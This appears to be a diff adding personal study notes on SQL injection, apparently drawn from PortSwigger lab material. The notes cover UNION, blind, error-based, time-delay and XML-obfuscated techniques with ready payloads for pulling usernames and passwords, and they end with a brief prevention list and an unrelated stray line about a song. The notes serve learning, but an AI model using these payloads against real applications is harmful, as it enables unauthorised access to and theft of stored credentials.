@@ -1,0 +1,199 @@
+When an attacker tries to manipulate or interfere with the SQL query done by the application on the SQL dB.
+
+Tool: SQL map, kali linux, metasploit, Burp vulnerability scanner
+cheatsheets: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+To see: Stored procedure
+
+Possible impacts:
+1) Retrieving hidden data:
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+
+2) Subverting application logic:
+Suppose there is some logic that takes both username and password in the sql query, then you could basically use comments and skip the entire rest of the SQL query.
+' --> for escaping out of the string.
+-- => for doing comments in the SQL query.
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+3) Retrieving data from other database tables:
+    SELECT name, description FROM products WHERE category = 'Gifts'
+    An attacker can submit the input:
+    ' UNION SELECT username, password FROM users--
+
+    SQL injection UNION attacks:
+    SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+    Conditions for UNION:
+    1) All SELECT queries must have the same number of colums
+    2) All the selected columns must have the same respective datatype
+
+    Determining the number of Columns in a table:
+
+    1) ORDER BY technique:
+    ' ORDER BY 1--
+    ' ORDER BY 2--
+    ' ORDER BY 3--
+    etc.
+
+    -> for one of the column that is not present in the table (the number exceeds), it would return an error or some unexpected behaviour.
+
+    2) UNION By technique:
+    ' UNION SELECT NULL--
+    ' UNION SELECT NULL,NULL--
+    ' UNION SELECT NULL,NULL,NULL--
+    hit and try on the number of NULLs and figure out which gives a good result This is better than ORDER BY because it will not work for initial values than work for one unliike order by 
+    which will work for all except after a certain time/
+
+    In Oracle: Select must have a FROM, therefore we can use a buildin table known as dual:
+    ' UNION SELECT NULL FROM DUAL--
+
+    3) Determine the Datatype of the columns:
+    This is doable in UNION attack also:
+    After finding the number of colums using the UNION attack, brute force every NULL by replacing it with the String datatype ('abcd') and check what column doesn't give errors
+    ' UNION SELECT username || '~' || password FROM users--
+
+    4) Examining the database in SQL injection attacks
+    We can use different types of specific to DB queries and check which one of them suceeds
+
+    Database type	Query
+    Microsoft, MySQL	SELECT @@version
+    Oracle	SELECT * FROM v$version
+    PostgreSQL	SELECT version()
+
+    Using the UNION attack: ' UNION SELECT @@version--
+
+    IMPORTANT: information_schema was almost all the information about the schema of the DB including all the tables, all the colums, etc. Then after knowing the colums you can directly fetch 
+    those tables using the column names.
+    Note: Oracle DB doesn't has Information Schema.
+
+    5) Determining all the tables and their schema in SQL on non-oracle DBs
+    SELECT * FROM information_schema.tables
+    SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+    
+    Everything will be executed using the UNION attack on a predefined query
+
+    6) Determing all the tables and their schema in SQL on Oracle DB
+    Note: Similar to information_schema, Oracle has all_tables and all_tab_columns 
+    SELECT * FROM all_tables
+    SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+    
+SQL injection in different parts of the query:
+    In UPDATE statements, within the updated values or the WHERE clause.
+    In INSERT statements, within the inserted values.
+    In SELECT statements, within the table or column name.
+    In SELECT statements, within the ORDER BY clause.
+
+
+Blind SQL injection:
+- SQL query with no results
+- When the result are not reflected in the HTTP response. 
+- We can use Time-delaying to identify the behaviour.
+
+- The application doesn't reflect the SQL result directly, doesn't return an error. Just some kind of true and false value is returned which can be used to get
+  the data bit my bit (character by character if you want a password), just give a conditional thing and look for somekind of true or false values.
+- There is no text response like in previous examples here but we can extract the data using the behaviour of the application and identify the true and falses.
+- To extract information we can append additional condition
+- You can use Sub queries to place the condition using the data from other table that you would love to exploit. (SELECT... sub query goes here)
+- Since you can't get much information in the Blind injection previously you would need to do a lot of hit and try, for example you can't get the content of information_schema
+  therefore you don't know the useful tables in the DB, so you have to do a lot of hit and tries, check if the USER table exist or not, etc, etc
+
+  Crux:
+  - Basically now the data is not going to be returned in the http response. the developers are not fool like security engineers. therefore now you are going to use some condition and try to trigger
+  something using it. Like if condition is true, do time delay, throw error, observe someething (that welcome back text)
+  - ye queries ka koi result nahi aata hai toh perheps these are not the usual queries like search queries, login queries, they are more like Tracking queries.
+
+
+  Examples of true and false values:
+  1) Maybe the result contain Welcome back! when the condition is true otherwise it doesn't.
+  2) Maybe the result can have some time delay (this can represent the false result)
+  3) Maybe you can throw a SQL error using 1/0 or something which could be used to detect False messages.
+
+
+Things you can check for:
+
+1) Result of some Conditional expression - some change like Welcome Back! is thrown when the expression is true
+2) Time delay 
+3) SQL error could be reflected to HTTP response:
+    The backend might not respond with detailed error messages or sql results, it might just give generic messages like the Bad request or something.
+    So, you have to look for stuff that you can use to detect some change:
+    Like Throw an error: It will give some Internal Server Error or something
+
+    Queries:
+    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+
+    To get the password mostly you will need to use some condition and this could be your payload:
+    xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+4) Extracting sensitive data via verbose SQL error messages:
+    - Sometimes the application might give verbose error messages.
+    - Sometimes the app might be writing error messages on to the http response.
+    So, you make use of cast query in this attack. Try to cast something to INT that couldn't be casted like password
+    and then the Backend will throw an error message giving the password and saying that this is not allowed.
+
+    Attac: 1 = CAST((SELECT example_column FROM example_table) AS int)
+    Response: ERROR: invalid input syntax for type integer: "Example data"
+
+    This is the way to convert Blind SQL message to visible ones.
+
+5) Exploiting blind SQL injection by triggering time delays:
+  Introduce time delay based on some condition
+  Queries:
+  '; IF (1=2) WAITFOR DELAY '0:0:10'--
+  '; IF (1=1) WAITFOR DELAY '0:0:10'--
+
+  Write your useful condition in place of those and utilize burp intruders time filter I think
+  since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+  Cookie: TrackingId=hGpjfNcmJrQp0JFW' || SLEEP(10) --; 
+
+  Need to URL encode this because it has space and some special characters
+
+  Time delay in DBs:
+
+  Oracle	dbms_pipe.receive_message(('a'),10)
+  Microsoft	WAITFOR DELAY '0:0:10'
+  PostgreSQL	SELECT pg_sleep(10)
+  MySQL	SELECT SLEEP(10)
+
+  Time based attack and also has SQL map in it: https://www.youtube.com/watch?v=Mfh_LIzfZ6c&list=PLWvfB8dRFqba0CSHMY23ih0tUNrK9iEJv&index=15
+
+6) Out of band SQL injection:
+  When the backend doesn't execute the sql query synchronously with the req-res cycle (I would do the same) then you can perform Out of Band DNS look up to a server from SQL.
+  so that whenever that sql queries executes we can have results in our server. This is specific to Db such as everything else.
+
+  Basically DNS lookup request me in Credentials daalke rakh do
+  (read karo sql se hota kaise hai ye or use kya hia ye karne ka)  
+
+
+7) SQL injection in different contexts:
+  SQL queries might be taken using various forms like JSON, XML, Plaintext.
+  If it is XML then maybe I can encode S to &#x53; to obfuscate S.
+  At the server side, the encoding is automatically going to be decoded giving you the original S for the "&#x53;ELECT"
+
+  Attack vector could be:
+  <stockCheck>
+      <productId>123</productId>
+      <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+  </stockCheck>
+
+  Tool:  Hackvertor (to XML encode on burp suite I think)
+
+  <@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
+
+
+  SQL Preventions:
+
+  1) Prepared statements
+  2) Whitelisting
+  3) Blacklisting
+  4) Do not execute synchronously the SQL queries. 
+
+
+Note: I can run more than 1 Select queries in one query by separating with ;  
+
+Parameterized SQL query,  
+
+
+
+Mr Beast song listen, money money, on and btw its about money, mr beast
+Of lover 
